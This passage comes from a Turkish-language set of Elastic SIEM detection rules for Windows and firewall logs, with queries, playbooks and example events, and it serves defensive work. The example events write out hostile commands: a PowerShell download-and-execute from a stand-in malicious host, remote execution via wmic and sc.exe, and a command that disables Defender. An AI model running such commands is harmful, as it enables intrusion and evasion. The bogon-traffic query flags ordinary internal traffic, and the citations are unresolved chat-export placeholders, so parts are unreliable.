  false_positive_notes: "Yeni donanım sürücü kurulumları veya bazı yazılımların yüklenmesi meşru olarak yeni servis oluşturabilir. Örneğin antivirüs veya VPN istemcileri servis ekler. Ancak sistemde beklenmeyen, rastgele adlandırılmış veya üreticiyle ilişkili olmayan servis isimleri dikkatle incelenmelidir."
  response_playbook:
    - "Servisin adını ve açıklamasını kontrol edin; bilinen bir yazılım veya donanım bileşeniyle ilişkili mi belirleyin."
    - "Servisin yürüttüğü yürütülebilir dosya yolunu bulun (`ImagePath`); dosyayı imza ve VirusTotal gibi kaynaklarla analiz edin."
    - "Eğer servis şüpheli ise, hemen durdurup devre dışı bırakın; ardından ilgili dosyayı karantinaya alın ve sistemden kaldırın."
    - "Aynı zaman diliminde benzer kalıcılık adımları (örn. Run key veya Scheduled Task eklenmesi) var mı kontrol ederek saldırganın kapsamını anlayın."
  references:
    - "MITRE ATT&CK T1543.003: Saldırganlar, sistem açılışında kötü amaçlı payload çalıştırmak için yeni bir servis kurabilir:contentReference[oaicite:17]{index=17}"
    - "MITRE ATT&CK T1569.002: Uzaktan veya lokal, Windows Service Control Manager üzerinden hizmet oluşturularak kod çalıştırılabilir:contentReference[oaicite:18]{index=18}"
  example_event: |
    {
      "@timestamp": "2025-10-03T14:50:00.000Z",
      "winlog.event_id": 7045,
      "event.provider": "Service Control Manager",
      "winlog.event_data.ServiceName": "BackupSecurityService",
      "winlog.event_data.ImagePath": "C:\\Windows\\system32\\bkpsecsvc.exe",
      "user.name": "SYSTEM",
      "host.name": "Server-03"
    }
  short_explanation: "Sistemde 'BackupSecurityService' adında yeni bir servis kuruldu. Alarm sonrasında bu servisin ne olduğunu doğrulayın; eğer meşru bir yazılım kurulumundan gelmiyorsa, servis dosyasını analiz edin ve hizmeti sistemden kaldırın."

- title: "Zamanlanmış Görev oluşturuldu (kalıcılık amaçlı)"
  id: "WIN-012"
  description: "Windows üzerinde yeni bir Zamanlanmış Görev (Scheduled Task) oluşturuldu. Saldırganlar, bu tekniği kötü amaçlı programlarını belirli aralıklarla veya sistem açılışında otomatik çalıştırmak için kullanır. (Ör. Event ID 4698 - 'Yeni zamanlanmış görev oluşturuldu')."
  severity: "medium (Planlanmış görevler sistem yönetiminde kullanılabilir; ancak beklenmedik yeni görevler kalıcılık belirtisi olabileceğinden orta derecede önemlidir.)"
  tags: ["mitre:T1053.005", "kill_chain:Installation"]
  mitre_attack:
    - "T1053.005: Scheduled Task"
  kill_chain_phase: "Installation"
  indices:
    - "winlogbeat-*"
  detection_query_kql: >-
    winlog.event_id: 4698
  detection_query_dsl: >-
    {
      "term": { "winlog.event_id": 4698 }
    }
  threshold_or_rate: "N/A (Her bir görev oluşturma olayı ayrı alarmdır.)"
  false_positive_notes: "Yazılım kurulumları veya sistem yöneticilerinin bakım amaçlı oluşturduğu görevler bu olayı üretebilir. Örneğin bir yazılım güncelleme zamanlaması 4698 eventi oluşturur. Ancak görev adı, yürüttüğü komut ve zamanlaması olağandışıysa (ör. garip isimler, Powershell ile internete bağlanma vb.), bu false positive değildir."
  response_playbook:
    - "Oluşturulan görevin adını ve tetikleme zamanını kontrol edin; beklenen bir ad (ör. \\Microsoft\\Windows\\... altında) mı yoksa rastgele mi."
    - "Görevin çalıştırdığı eylemi inceleyin (örn. komut satırı, betik yolu); zararlı bir payload içerip içermediğini belirlemek için bu komutu analiz edin."
    - "Eğer görev zararlıysa, Görev Zamanlayıcı'dan silin ve tetiklediği dosyayı sistemden kaldırın; ilgili kullanıcı hesabının yetkilerini gözden geçirin."
    - "Ağ genelinde benzer isimde/komutta görevler başka sistemlere de eklenmiş mi, merkezi loglardan veya Elastic aramalarından araştırın."
  references:
    - "MITRE ATT&CK T1053.005: Saldırganlar, Windows Görev Zamanlayıcıyı kötü amaçlı kodu periyodik veya başlangıçta çalıştırmak için kötüye kullanabilir:contentReference[oaicite:19]{index=19}:contentReference[oaicite:20]{index=20}"
  example_event: |
    {
      "@timestamp": "2025-10-03T14:55:00.000Z",
      "winlog.event_id": 4698,
      "winlog.event_data.TaskName": "\\Windows\\Updater\\MaliciousTask",
      "winlog.event_data.TaskContent": "<Actions><Exec><Command>C:\\Windows\\system32\\cmd.exe</Command><Arguments>/c start C:\\Temp\\backdoor.exe</Arguments></Exec></Actions>",
      "user.name": "John.Doe",
      "host.name": "PC-07"
    }
  short_explanation: "Sistemde 'MaliciousTask' adında bir zamanlanmış görev oluşturuldu. Alarmı aldıktan sonra, bu görevin tetiklediği komutu ve zamanlamayı hemen analiz edin; eğer kötü niyetliyse görevi silip ilgili dosyaları temizleyin."

- title: "PowerShell ile harici kaynak indirme (Ingress Tool Transfer)"
  id: "WIN-013"
  description: "PowerShell aracılığıyla harici bir kaynaktan dosya/araç indirme girişimi tespit edildi. Örneğin Invoke-WebRequest, New-Object Net.WebClient DownloadString veya benzeri komutlarla internetten dosya çekiliyor. Bu yöntem, saldırganların zararlı yüklerini doğrudan bellekten indirmesine olanak tanır."
  severity: "high (PowerShell'in internetten dosya indirmesi, genellikle saldırı hazırlığının göstergesi olduğundan kritik önemdedir.)"
  tags: ["mitre:T1105", "kill_chain:Installation"]
  mitre_attack:
    - "T1105: Ingress Tool Transfer"
  kill_chain_phase: "Installation"
  indices:
    - "winlogbeat-*"
  detection_query_kql: >-
    process.name: "powershell.exe" and process.command_line: "*Invoke-WebRequest*"
  detection_query_dsl: >-
    {
      "bool": {
        "must": [
          { "term": { "process.name": "powershell.exe" } },
          { "wildcard": { "process.command_line": "*Invoke-WebRequest*" } }
        ]
      }
    }
  threshold_or_rate: "N/A (Her tespit alarm sayılır.)"
  false_positive_notes: "PowerShell ile internetten indirme, bazı yönetim scriptlerinde görülebilir (ör. yazılım kurulumu için modül indirme). Ancak bu kullanım sınırlı ve genellikle denetim altındadır. Beklenmeyen bir sistemde bu tespit ediliyorsa, çoğunlukla zararlıdır."
  response_playbook:
    - "PowerShell komut satırını tam olarak inceleyin; hangi URL veya IP'den indirme yapılıyor, tespit edin ve URL'yi bloklayın."
    - "İndirilen içeriğin bellekte kalmış olma ihtimaline karşı ilgili PowerShell işleminin bellek dökümünü veya komut çıktısını yakalamaya çalışın."
    - "Aynı URL veya dosya adı, diğer makinelerde de çağrılmış mı Elastic araması yaparak belirleyin (saldırgan ağda yayılım denemiş olabilir)."
    - "İlgili makineyi ağdan izole edin ve dijital adli analiz yapın; zararlı dosya indirilip çalıştırılmışsa, kalıntıları (yazılım, servis, görev) temizleyin."
  references:
    - "MITRE ATT&CK T1105: Saldırganlar uzaktan araç/dosya aktarımı yaparak hedefe kendi araçlarını getirebilir:contentReference[oaicite:21]{index=21}:contentReference[oaicite:22]{index=22}"
    - "MITRE ATT&CK T1105: Windows ortamında certutil veya PowerShell (Invoke-WebRequest gibi) komutları indirme için sık kullanılır:contentReference[oaicite:23]{index=23}"
  example_event: |
    {
      "@timestamp": "2025-10-03T15:00:00.000Z",
      "process.name": "powershell.exe",
      "process.command_line": "powershell -Command IEX(New-Object Net.WebClient).DownloadString('http://malicious.example.com/payload.ps1')",
      "user.name": "Administrator",
      "host.name": "Server-04"
    }
  short_explanation: "PowerShell komutu, internetten bir içerik indirmeye ve çalıştırmaya çalıştı. Alarmı gördüğünüzde, komut içindeki URL'yi ve indirilen içeriği analiz edin; muhtemel zararlı yükü indirip indirmediğini tespit edin ve gerekiyorsa sistemi izole edin."

- title: "WMI ile uzaktan kod yürütme denemesi (WMIC Process Call)"
  id: "WIN-014"
  description: "Windows WMIC aracı kullanılarak uzak bir sistemde işlem yaratma girişimi tespit edildi. `wmic process call create` komutunun kullanımı, genellikle saldırganların etki alanı içinde yayılmak veya uzak sistemlerde komut çalıştırmak için başvurduğu bir Yanal Hareket tekniğidir."
  severity: "high (WMI üzerinden uzak kod yürütme, saldırganın ağ içinde hareket ettiğini gösterdiğinden kritik önemdedir.)"
  tags: ["mitre:T1047", "kill_chain:ActionsOnObjectives"]
  mitre_attack:
    - "T1047: Windows Management Instrumentation"
  kill_chain_phase: "ActionsOnObjectives"
  indices:
    - "winlogbeat-*"
  detection_query_kql: >-
    process.command_line: "*wmic*process call create*"
  detection_query_dsl: >-
    {
      "wildcard": { "process.command_line": "*wmic*process call create *" }
    }
  threshold_or_rate: "N/A (Tek seferlik tespit alarm oluşturur.)"
  false_positive_notes: "WMIC ile uzaktan süreç oluşturma, tipik BT yönetiminde çok nadir kullanılır. Genellikle saldırı simülasyonu ya da yayılma testleri dışında görülmez. Bu nedenle, bu etkinlik hemen her zaman kötü niyetlidir."
  response_playbook:
    - "WMIC komutunu çalıştıran sistemi ve kullanıcıyı belirleyin; bu kullanıcı ve sistem compromise olmuş olabilir, derhal inceleyin."
    - "Hedef alınan uzak makineye bağlanarak, `wmic` komutuyla ne çalıştırılmaya çalışıldığını loglardan (Security log 4688 veya Sysmon Event 1) tespit edin."
    - "İlgili kaynak ve hedef sistemlerde, aynı zaman diliminde başka WMI etkinlikleri (Event ID 5861 veya Sysmon Event 10) var mı araştırın."
    - "Ağ seviyesinde, RPC üzerinden WMI isteklerini izleyip engellemek için kural uygulayın (özellikle beklenmeyen sistemler arası 135/tcp trafiği için alarm oluşturun)."
  references:
    - "MITRE ATT&CK T1047: WMI ile uzaktan süreç başlatma mümkündür; örneğin `wmic /node:<hedef> process call create <komut>` ile hedefte kod çalıştırılabilir:contentReference[oaicite:24]{index=24}"
    - "Splunk araştırması: `wmic process call create` kullanımını tespit etmek, uzaktan WMI saldırılarını yakalamada kritik bir yöntemdir:contentReference[oaicite:25]{index=25}:contentReference[oaicite:26]{index=26}"
  example_event: |
    {
      "@timestamp": "2025-10-03T15:05:00.000Z",
      "process.name": "wmic.exe",
      "process.command_line": "wmic /node:\"PC-Target\" process call create \"powershell -ExecutionPolicy Bypass -File \\\\Server\\share\\payload.ps1\"",
      "user.domain": "CORP",
      "user.name": "hacker",
      "host.name": "PC-08"
    }
  short_explanation: "WMIC aracı kullanılarak 'PC-Target' isimli uzak sisteme komut gönderildi (process call create ile). Alarm sonrası, komutu gönderen sistemi ve hedef sistemi detaylı inceleyin; genellikle bu, saldırganın ağ içinde WMI ile lateral hareket yaptığını gösterir."

- title: "SC.exe ile uzaktan servis oluşturma (Lateral Movement)"
  id: "WIN-015"
  description: "Windows Service Control (sc.exe) komutu kullanılarak uzak bir makinede servis oluşturma veya mevcut servisi manipüle etme girişimi tespit edildi. Saldırganlar, `sc \\\\<hedef> create/start` gibi komutlarla ağ içindeki diğer sistemlere zararlı servisler yükleyerek yatay hareket gerçekleştirir."
  severity: "high (Uzak bir sistemde servis oluşturma, saldırganın ağ içerisinde yayılmaya çalıştığını gösterdiğinden kritik kabul edilir.)"
  tags: ["mitre:T1569.002", "kill_chain:ActionsOnObjectives"]
  mitre_attack:
    - "T1569.002: Service Execution"
  kill_chain_phase: "ActionsOnObjectives"
  indices:
    - "winlogbeat-*"
  detection_query_kql: >-
    process.name: "sc.exe" and process.command_line: "*\\\\*"
  detection_query_dsl: >-
    {
      "bool": {
        "must": [
          { "term": { "process.name": "sc.exe" } },
          { "wildcard": { "process.command_line": "*\\\\*" } }
        ]
      }
    }
  threshold_or_rate: "N/A (Her komut tespiti alarmdır.)"
  false_positive_notes: "Sistem yöneticileri bazen uzaktan hizmet yönetimi için sc.exe kullanabilir, ancak bu genelde merkezi yönetim araçlarıyla yapılır. Tek tek sc.exe komutlarının elle kullanımı nadirdir. Bu yüzden bu tespit çoğunlukla kötü amaçlıdır, özellikle hedef olarak istemci sistemler varsa."
  response_playbook:
    - "Komutu çalıştıran kullanıcıyı ve kaynağı (hangi makineden) belirleyin; bu kaynak makine muhtemelen ele geçirilmiştir, derhal analiz edin."
    - "Hedef makine üzerinde yeni bir servis oluşturulmuşsa, servis adını ve çalıştırdığı exe dosyasını bulun; zararlıysa servisi durdurup silin ve dosyayı kaldırın."
    - "SC.exe komutunun tam parametrelerini logdan inceleyin (örneğin, 'sc \\\\HOST create <...>' içinde geçen dosya yolunu ve servis adını not edin)."
    - "Active Directory ortamında, ilgili hesabın o hedef makineye erişim yetkileri olup olmadığını denetleyin; gerekirse hesabı devre dışı bırakın ve parolasını değiştirin."
  references:
    - "MITRE ATT&CK T1569.002: Windows Service Control Manager (services.exe) üzerinden uzak sistemlerde komut icrası yapılabilir; sc.exe bu amaçla kullanılabilir:contentReference[oaicite:27]{index=27}"
    - "MITRE ATT&CK T1569.002: PsExec gibi araçlar da geçici servis oluşturarak uzaktan payload çalıştırır, sc.exe de benzer şekilde remote parametreyle kullanılabilir:contentReference[oaicite:28]{index=28}"
  example_event: |
    {
      "@timestamp": "2025-10-03T15:10:00.000Z",
      "process.name": "sc.exe",
      "process.command_line": "sc \\\\CORP-FILESVC create MalService binPath= C:\\Windows\\Temp\\malicious.exe start= auto",
      "user.name": "CORP\\admin_jane",
      "host.name": "Admin-PC"
    }
  short_explanation: "Bir yönetici aracı (sc.exe) kullanılarak uzak bir makinede 'MalService' adlı bir servis yaratılmaya çalışıldı. Bu alarmı inceleyerek, komutu yollayan sistemi (Admin-PC) ve hedef sistemi derhal tetkik edin; genellikle bu, saldırganın ağda lateral movement yaptığını gösterir."

- title: "Windows güvenlik logları temizlendi"
  id: "WIN-016"
  description: "Windows Olay Günlükleri'nin (özellikle Güvenlik günlüğü) temizlendiği tespit edildi. Güvenlik logunun silinmesi (Event ID 1102) genellikle izlerini gizlemeye çalışan bir saldırganın eylemidir. Bu işlem, sistemdeki önceki güvenlik olaylarının kaybolmasına neden olur."
  severity: "high (Bir saldırganın izlerini örtbas etmek için logları sildiğini gösterdiğinden kritik önemdedir.)"
  tags: ["mitre:T1070.001", "kill_chain:ActionsOnObjectives"]
  mitre_attack:
    - "T1070.001: Indicator Removal on Host: Clear Windows Event Logs"
  kill_chain_phase: "ActionsOnObjectives"
  indices:
    - "winlogbeat-*"
  detection_query_kql: >-
    winlog.event_id: 1102
  detection_query_dsl: >-
    {
      "term": { "winlog.event_id": 1102 }
    }
  threshold_or_rate: "N/A (Log temizleme olayı tek başına kritiktir.)"
  false_positive_notes: "Olay günlüklerinin temizlenmesi normal operasyonlarda yapılmaz. Yalnızca nadir durumlarda yönetici hatalarıyla loglar silinebilir (örneğin disk doluluk müdahalesi), fakat bu bile çok sıra dışıdır. Dolayısıyla 1102 olayı hemen her zaman bir saldırı göstergesidir."
  response_playbook:
    - "Hangi kullanıcı veya süreç tarafından logların silindiğini Windows Güvenlik loglarından (Event 1102'nin kendi kayıt detayında Subject User) öğrenin; ilgili hesabı derhal kilitleyin."
    - "Merkezi log sunucunuz varsa, bu makineye ait geçmiş logları oradan analiz edin; saldırganın log silmeden önceki aktivitelerini (ör. hangi araçlar çalışmış) ortaya çıkarmaya çalışın."
    - "Etkilenen sistemi ağdan izole edin ve adli analiz için bellek/disk görüntüsü alın; logların silinmesi, öncesinde gerçekleşen saldırı adımlarını gizlemeye yönelik olduğundan derin inceleme yapın."
    - "Saldırı izlerini restore etmek zor olabileceğinden, gelecekteki benzer durumlar için Event Forwarding veya SIEM entegrasyonu ile logları anlık olarak merkezi bir yere kopyalamanız önerilir."
  references:
    - "MITRE ATT&CK T1070.001: Saldırganlar izlerini gizlemek için Windows olay günlüklerini (Security, System) temizleyebilir:contentReference[oaicite:29]{index=29}"
    - "Windows 1102 olayı: Güvenlik denetim günlüğü temizlendi; bu genellikle bir saldırganın logları silmeye karar verdiği kritik bir andır:contentReference[oaicite:30]{index=30}:contentReference[oaicite:31]{index=31}"
  example_event: |
    {
      "@timestamp": "2025-10-03T15:15:00.000Z",
      "winlog.event_id": 1102,
      "winlog.channel": "Security",
      "user.name": "MACHINE$",
      "host.name": "PC-09",
      "event.action": "Audit Log Cleared"
    }
  short_explanation: "Bir sistemde Windows Güvenlik logları temizlendi (Event ID 1102). Bu alarm geldiğinde, ilgili makinenin potansiyel olarak kompromize olduğunu varsayın; logları merkezi kayıtlardan inceleyip saldırgan aktivitelerini ortaya çıkarmaya odaklanın."

- title: "Windows Defender devre dışı bırakıldı veya ayarları değiştirildi"
  id: "WIN-017"
  description: "Windows Defender veya benzeri güvenlik aracının ayarlarının saldırgan tarafından devre dışı bırakılmaya çalışıldığı tespit edildi. Örneğin, `Set-MpPreference -DisableRealtimeMonitoring` komutu çalıştırılmış veya kayıt defterinde antivirüs kapatma anahtarları değişmiş olabilir. Bu davranış, saldırganın tespit edilmekten kaçınmak için savunmaları etkisiz hale getirme girişimidir."
  severity: "high (Saldırgan sistemdeki güvenlik yazılımlarını devre dışı bırakmaya çalıştığı için kritik önemdedir.)"
  tags: ["mitre:T1562.001", "kill_chain:Installation"]
  mitre_attack:
    - "T1562.001: Disable or Modify Tools"
  kill_chain_phase: "Installation"
  indices:
    - "winlogbeat-*"
  detection_query_kql: >-
    process.command_line: "*DisableRealtimeMonitoring*"
  detection_query_dsl: >-
    {
      "wildcard": { "process.command_line": "*DisableRealtimeMonitoring*" }
    }
  threshold_or_rate: "N/A (Tekil tespit alarm için yeterlidir.)"
  false_positive_notes: "Gerçek zamanlı korumayı devre dışı bırakmak, ancak bazı özel durumlarda sistem yöneticisi tarafından geçici olarak yapılabilir (ör. sorun giderme). Ancak bu son derece nadirdir ve kurumsal politikalarla genelde sınırlanır. Dolayısıyla bu etkinlik hemen her zaman şüphelidir."
  response_playbook:
    - "Defender kapatma komutunu kim çalıştırmış tespit edin (kullanıcı hesabı ve süreç); ilgili hesabın yetkilerini ve faaliyetlerini hemen denetleyin."
    - "Sistemdeki antivirüs durumu kontrol edin; eğer kapalıysa derhal yeniden etkinleştirin ve güncel tarama yapın. Başka güvenlik ayarları da değişmiş mi (örn. güvenlik duvarı) inceleyin."
    - "Etkilenen makineye olası zararlı yazılım bulaşmış olabileceği için tam tarama dışında, bellek analiz araçlarıyla kötü niyetli işlemler arayın."
    - "Saldırganın bu adımı atmış olması, sonraki zararlı aktivitelerini gizlemek içindir; bu nedenle sistemin kapsamlı adli analizini planlayın ve aynı ağ segmentindeki diğer makinelerde benzer girişimler (Defender uyarıları kapatılması gibi) olmuş mu kontrol edin."
  references:
    - "MITRE ATT&CK T1562.001: Saldırganlar, güvenlik yazılımlarını devre dışı bırakarak araçlarının tespit edilmesini engellemeye çalışabilir (örn. AV süreçlerini sonlandırma, ayarları değiştirme):contentReference[oaicite:32]{index=32}"
    - "MITRE ATT&CK T1562.001: Örneğin, saldırganlar Windows Defender'ı kapatmak için kayıt defteri veya PowerShell komutları kullanabilir; bu savunma zayıflatma tekniğinin bir parçasıdır:contentReference[oaicite:33]{index=33}"
  example_event: |
    {
      "@timestamp": "2025-10-03T15:20:00.000Z",
      "process.name": "powershell.exe",
      "process.command_line": "powershell Set-MpPreference -DisableRealtimeMonitoring 1",
      "user.name": "CORP\\itadmin",
      "host.name": "PC-10"
    }
  short_explanation: "Bir komut, Windows Defender gerçek zamanlı korumasını devre dışı bırakmaya çalıştı. Alarm alındığında, bu işlemi başlatan kullanıcıyı ve sistemi hemen inceleyin; güvenlik yazılımlarını tekrar etkinleştirin ve saldırganın izlerini arayın."

- title: "Saldırı düzeni IP (Bogon) üzerinden gelen trafik"
  id: "FW-001"
  description: "Güvenlik duvarı loglarında, geçersiz veya rezerve edilmiş bir kaynak IP adresinden (bogon IP) iç ağa bağlantı girişimi gözlemlendi. Örneğin, internet tarafından '10.x.x.x' gibi özel bir IP kaynak olarak görülüyorsa, bu muhtemelen IP spoofing yaparak tarama gerçekleştiren bir saldırganı işaret eder."
  severity: "medium (Geçersiz kaynak IP ile gelen trafik genellikle kötü niyetli tarama veya manipülasyon girişimidir, orta düzeyde önemlidir.)"
  tags: ["mitre:T1595", "kill_chain:Reconnaissance"]
  mitre_attack:
    - "T1595: Active Scanning"
  kill_chain_phase: "Reconnaissance"
  indices:
    - "firewall-*"
  detection_query_kql: >-
    source.ip: ("10.0.0.0/8" or "172.16.0.0/12" or "192.168.0.0/16" or "127.0.0.0/8" or "169.254.0.0/16") and destination.ip: ("10.0.0.0/8" or "192.168.0.0/16" or "172.16.0.0/12")
  detection_query_dsl: >-
    {
      "bool": {
        "must": [
          {
            "terms": {
              "source.ip": ["10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16", "127.0.0.0/8", "169.254.0.0/16"]
            }
          },
          {
            "terms": {
              "destination.ip": ["10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16"]
            }
          }
        ]
      }
    }
  threshold_or_rate: "N/A (Tek seferlik tespit alarmdır.)"
  false_positive_notes: "Bogon IP kaynaklı trafik, genel internette normalde görülmez. Bazı yanlış yapılandırmalar veya ISP hataları ile nadiren ortaya çıkabilir, ancak çoğunlukla spoofed (sahte) tarama trafiğidir. Dolayısıyla, FP olasılığı düşüktür."
  response_playbook:
    - "Güvenlik duvarı üzerinden gelen paketlerin hedefini ve protokolünü inceleyin; saldırgan belli bir servisi mi hedef almış belirleyin."
    - "Kaynak bogon IP adresini ağ trafiği izleme cihazlarında filtreleyin/engelleyin (muhtemelen spoof edildiği için net bir kaynak kimliği olmayacaktır)."
    - "Bu tür trafiğin sık gelip gelmediğini geçmiş loglarda arayın; sürekli bir tarama varsa, internet servis sağlayıcınızla görüşüp upstream filtreleme talep edin."
    - "İç ağda, hedeflenen IP'nin hangi sistem olduğunu ve açık portlarını kontrol edin; saldırgan bir zafiyet taraması yapıyor olabilir, ilgili sistemi ekstra koruma altına alın."
  references:
    - "MITRE ATT&CK T1595: Aktif tarama - saldırganlar kurbana doğrudan paketler göndererek açık sistem ve servisleri ararlar:contentReference[oaicite:34]{index=34}"
  example_event: |
    {
      "@timestamp": "2025-10-03T15:25:00.000Z",
      "source.ip": "10.123.45.6",
      "destination.ip": "192.168.1.100",
      "destination.port": 445,
      "network.transport": "TCP",
      "event.action": "DENY",
      "host.name": "FW-Cluster-1"
    }
  short_explanation: "Dış kaynaklı, geçersiz (özel) bir IP adresinden iç ağa bağlantı denemesi engellendi. Alarmı alır almaz, bu trafiğin hedefini (192.168.1.100 üzerindeki port 445) ve sıklığını inceleyin; muhtemel bir spoof edilmiş port taramasıyla karşı karşıyasınız."

- title: "Çok sayıda engellenen bağlantı (Port tarama şüphesi)"
  id: "FW-002"
  description: "Aynı kaynaktan kısa süre içerisinde iç ağdaki bir veya birden fazla sisteme yönelik çok sayıda engellenmiş bağlantı girişimi gözlemlendi. Bu davranış, tarama yapan bir saldırganın birden fazla porta veya IP'ye ardışık istekler göndermesiyle uyumludur (örn. SYN port taraması)."
  severity: "medium (Yoğun tarama aktivitesi ağ keşfi belirtisi olduğu için orta derecede önemlidir.)"
  tags: ["mitre:T1595", "kill_chain:Reconnaissance"]
  mitre_attack:
    - "T1595: Active Scanning"
  kill_chain_phase: "Reconnaissance"
  indices:
    - "firewall-*"
  detection_query_kql: >-
    action: "deny"
  detection_query_dsl: >-
    {
      "term": { "action": "deny" }
    }
  threshold_or_rate: "Kaynak IP başına 20 engellenen bağlantı denemesi (1 dk içinde)"
  false_positive_notes: "Yoğun bağlantı denemeleri, nadiren meşru olabilir (örneğin, yanlış yapılandırılmış bir uygulama sürekli yeniden bağlanmaya çalışabilir). Ancak aynı IP'den birçok farklı porta ardışık engellemeler büyük olasılıkla tarama aktivitesidir. Bilinen güvenlik tarama araçlarınız varsa (penetration test vb.), bunları whiteliste tuttuğunuzdan emin olun."
  response_playbook:
    - "Güvenlik duvarının tespit ettiği kaynak IP'yi belirleyin; dış IP ise kötü amaçlı olarak engellemeyi sürdürün, iç IP ise ele geçirilmiş bir iç makine olabilir, onu izole edin."
    - "Taramanın hedeflerini ve port aralığını inceleyin; saldırgan belirli yaygın portları mı yokluyor (ör. 22, 445) yoksa geniş bir tarama mı yapıyor, anlayın."
    - "Eğer mümkünse IPS/IDS cihazlarınızdan bu kaynağa ait ek detaylar (paket içerikleri) alın; belki bilinen bir tarama aracı imzası yakalayabilirsiniz."
    - "İç ağınızda segmentasyon ve geçiş kontrolü uygulayarak, taramadan etkilenen ağ bölümünde ekstra trafik sınırlamaları getirin; ayrıca ileride bu kaynağa ait benzer trafik olursa hızlıca uyarı alacak şekilde kural ekleyin."
  references:
    - "MITRE ATT&CK T1595: Aktif Tarama teknikleri; saldırganlar ağdaki açık port ve hizmetleri yoğun şekilde arayabilir:contentReference[oaicite:35]{index=35}"
    - "Bir kaynaktan çok sayıda ardışık bağlantı hatası (ör. SYN flood) genellikle port taraması veya DoS denemesidir:contentReference[oaicite:36]{index=36} (hata kilidi/politikalar devreye girebilir)."
  example_event: |
    {
      "@timestamp": "2025-10-03T15:30:00.000Z",
      "source.ip": "203.0.113.45",
      "destination.ip": "192.168.1.50",
      "destination.port": 80,
      "action": "deny",
      "network.transport": "TCP",
      "event.outcome": "blocked",
      "host.name": "Main-FW"
    }
  short_explanation: "203.0.113.45 kaynak IP'si, iç ağınızdaki 192.168.1.50 IP'sine birden fazla porta art arda bağlantı denemiş ve engellenmiş. Alarm alındığında, bu kaynağı engelleyin ve hedef sistem üzerinde anormal trafik olup olmadığını doğrulayın; ağınız bir port taraması altında olabilir."

- title: "Olağandışı ülkeye/yabancı bölgeye çıkış trafiği"
  id: "FW-003"
  description: "İç ağdan, normalde iletişim kurulmayan ülkelere veya coğrafi bölgelere doğru izin verilmiş ağ trafiği tespit edildi. Örneğin Türkiye merkezli bir şirket ağından Kuzey Kore veya benzeri nadir hedef ülkelere doğru  bağlantı çıkışı gerçekleşmiş. Bu durum, Komuta-Kontrol (C2) trafiğine veya veri sızıntısına işaret edebilir."
  severity: "medium (Alışılmadık ülkelere giden trafik anormal aktivite göstergesi olduğundan orta seviyede önemlidir.)"
  tags: ["mitre:T1071", "kill_chain:CommandAndControl"]
  mitre_attack:
    - "T1071: Application Layer Protocol"
  kill_chain_phase: "CommandAndControl"
  indices:
    - "firewall-*"
  detection_query_kql: >-
    network.direction: outbound and destination.geo.country_iso_code: ("KP" or "IR" or "SY" or "RU") and action: "allow"
  detection_query_dsl: >-
    {
      "bool": {
        "must": [
          { "term": { "network.direction": "outbound" } },
          { "terms": { "destination.geo.country_iso_code": ["KP", "IR", "SY", "RU"] } },
          { "term": { "action": "allow" } }
        ]
      }
    }
  threshold_or_rate: "N/A (Tek bir bağlantı bile alarm olarak değerlendirilir.)"
  false_positive_notes: "Yabancı ülkelere çıkan trafik her zaman kötü niyetli olmayabilir; örneğin global hizmetler (CDN'ler veya bulut sağlayıcılar) farklı ülkelerde sunucu barındırabilir. Ancak organizasyonunuzun iş yapmadığı, özellikle yüksek riskli ülkeler (KP, SY vb.) hedefliyse, bu trafik büyük olasılıkla şüphelidir. Gerektiğinde coğrafi engelleme politikalarınızı gözden geçirin."
  response_playbook:
    - "İlgili dış IP adresini ve hedef ülkeyi netleştirin; coğrafi veritabanından daha fazla bilgi alarak (ISP, bölge vb.) bu bağlantının niteliğini anlamaya çalışın."
    - "Çıkış yapan iç kaynak IP'yi belirleyerek o sistemde anormallik belirtileri arayın (muhtemelen kompromize olmuştur ve C2'ye bağlanıyor)."
    - "Güvenlik duvarında bu hedef ülkeye/IP'ye ait trafiği geçici olarak engelleyin; trafikteki protokolü inceleyin (ör. HTTPS ise SNI bilgisi, DNS ise sorgu adı gibi)."
    - "Olay sonrası, şirket ağınızdan hangi ülkelere rutin olarak trafik çıktığını belirleyip beklenmeyen bölgeler için coğrafi filtreler veya uyarılar tanımlayın."
  references:
    - "MITRE ATT&CK T1571 (Non-Standard Port): Saldırganlar alışılmadık portlar/protokoller kullanarak iletişim kurar - örneğin HTTPS'i 443 yerine 8088 portundan veya beklenmeyen hedeflere:contentReference[oaicite:37]{index=37}"
    - "Saldırgan C2 trafiği, genellikle hedefledikleri kurbanın jeopolitik durumuna aldırmaksızın kendi altyapılarına (farklı ülkelerde barındırılan sunucular) doğru olur; beklenmedik ülkelere trafik bu nedenle C2 göstergesi olabilir."
  example_event: |
    {
      "@timestamp": "2025-10-03T15:35:00.000Z",
      "source.ip": "192.168.10.5",
      "destination.ip": "175.45.176.1",
      "destination.port": 443,
      "destination.geo.country_iso_code": "KP",
      "network.direction": "outbound",
      "action": "allow",
      "bytes": 5120
    }
  short_explanation: "İç IP 192.168.10.5'ten Kuzey Kore (KP) kaynaklı bir IP adresine outbound HTTPS trafiği görüldü. Bu alarm alındığında, ilgili iç sistemi (192.168.10.5) hemen inceleyin; muhtemel bir C2 bağlantısı olabilir, trafiği engelleyin ve sistemi zararlı için tarayın."

- title: "İzinsiz dış servislere çıkış (SMB/RDP internet bağlantısı)"
  id: "FW-004"
  description: "İç ağdaki bir sistemin, internet üzerindeki bir sunucuya normalde kullanılmaması gereken bir servis portundan bağlantı kurmaya çalıştığı tespit edildi. Örneğin, bir istemci makinesi 445/TCP (SMB) veya 3389/TCP (RDP) portu üzerinden internete bağlantı yapıyorsa bu sıra dışıdır ve olası bir zararlı aktiviteye (worm veya dışarı sızma) işaret eder."
  severity: "high (İç sistemin dışarıya SMB/RDP gibi riskli protokollerle bağlanması ciddi bir güvenlik ihlali göstergesidir.)"
  tags: ["mitre:T1021.001", "mitre:T1021.002", "kill_chain:ActionsOnObjectives"]
  mitre_attack:
    - "T1021.001: Remote Desktop Protocol"
    - "T1021.002: SMB/Windows Admin Shares"
  kill_chain_phase: "ActionsOnObjectives"
  indices:
    - "firewall-*"
  detection_query_kql: >-
    destination.port: (445 or 3389 or 5985 or 5986) and network.direction: outbound and action: "allow"
  detection_query_dsl: >-
    {
      "bool": {
        "must": [
          { "terms": { "destination.port": [445, 3389, 5985, 5986] } },
          { "term": { "network.direction": "outbound" } },
          { "term": { "action": "allow" } }
        ]
      }
    }
  threshold_or_rate: "N/A (Tek bir bağlantı denemesi alarm için yeterli.)"
